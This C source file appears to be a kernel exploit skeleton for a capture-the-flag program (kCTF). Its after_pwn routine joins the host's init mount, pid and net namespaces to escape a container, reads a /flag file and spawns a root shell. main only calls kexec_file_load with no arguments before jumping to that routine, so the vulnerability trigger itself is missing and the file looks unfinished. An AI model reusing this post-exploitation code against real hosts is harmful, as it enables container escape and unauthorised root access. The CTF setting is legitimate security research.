#define _GNU_SOURCE

#include <arpa/inet.h>
#include <endian.h>
#include <errno.h>
#include <fcntl.h>
#include <net/if.h>
#include <net/if_arp.h>
#include <netinet/in.h>
#include <sched.h>
#include <setjmp.h>
#include <signal.h>
#include <stdarg.h>
#include <stdbool.h>
#include <time.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/mount.h>
#include <sys/prctl.h>
#include <sys/resource.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/uio.h>
#include <sys/wait.h>
#include <unistd.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <assert.h>
#include <sys/inotify.h>
#include <linux/xfrm.h>
#include <linux/pfkeyv2.h>

#include <linux/pkt_cls.h>

#include <linux/capability.h>
#include <linux/genetlink.h>
#include <linux/if_addr.h>
#include <linux/if_ether.h>
#include <linux/if_link.h>
#include <linux/if_packet.h>
#include <keyutils.h>
#include <sys/xattr.h>
#include <err.h>
#include <sys/timerfd.h>
#include <sys/epoll.h>
#include <sys/eventfd.h>
#include <pthread.h>
#include <linux/if_packet.h>
#include <netinet/tcp.h>
#include <linux/tls.h>
#include <linux/if_alg.h>
#include <math.h>
#include <libaio.h>
#include <linux/netfilter/xt_nfacct.h>

void get_kctf_flag()
{
        char buf[512];


        int fd = open("/flag", O_RDONLY);

        if (fd < 0)
                return;

        size_t n = read(fd, buf, sizeof(buf));
        if (n > 0) {
                printf("Flag:\n");

                write(1, buf, n);

                printf("\n");
        }

        close(fd);
}
void set_cpu(int cpu)
{
        cpu_set_t cpus;
        CPU_ZERO(&cpus);      
        CPU_SET(cpu, &cpus);     
        if (sched_setaffinity(0, sizeof(cpu_set_t), &cpus) < 0) {
                perror("setaffinity");
                exit(1);
        }
}


static char *g_sh_argv[] = {"sh", NULL};

static int g_status;
void __attribute__((naked)) after_pwn()
{

        set_cpu(1);

        int pid = fork();

        if (!pid) {

        if (setns(open("/proc/1/ns/mnt", O_RDONLY), 0) < 0)
                perror("setns");

        setns(open("/proc/1/ns/pid", O_RDONLY), 0);
        setns(open("/proc/1/ns/net", O_RDONLY), 0);

        if (access("/proc/vmallocinfo", R_OK)) {
                printf("Exploit failed!\n");
                exit(1);
        }
        printf("\nGot root!!!\n");
        printf("Getting kctf flags ...\n");

        get_kctf_flag();

        printf("Launching shell, system will crash when you exit because I didn't bother with recovery ...\n");
        execve("/bin/sh", g_sh_argv, NULL);
        _exit(0);
        }

        waitpid(pid, &g_status, 0);

       

        printf("Shell exited, sleeping for 30 seconds, after that system might crash\n");

        sleep(30);
        _exit(0);
}

int main()
{
        int ret = syscall(__NR_kexec_file_load);
        printf("ret: 0x%px\n", ret);
        after_pwn();
}
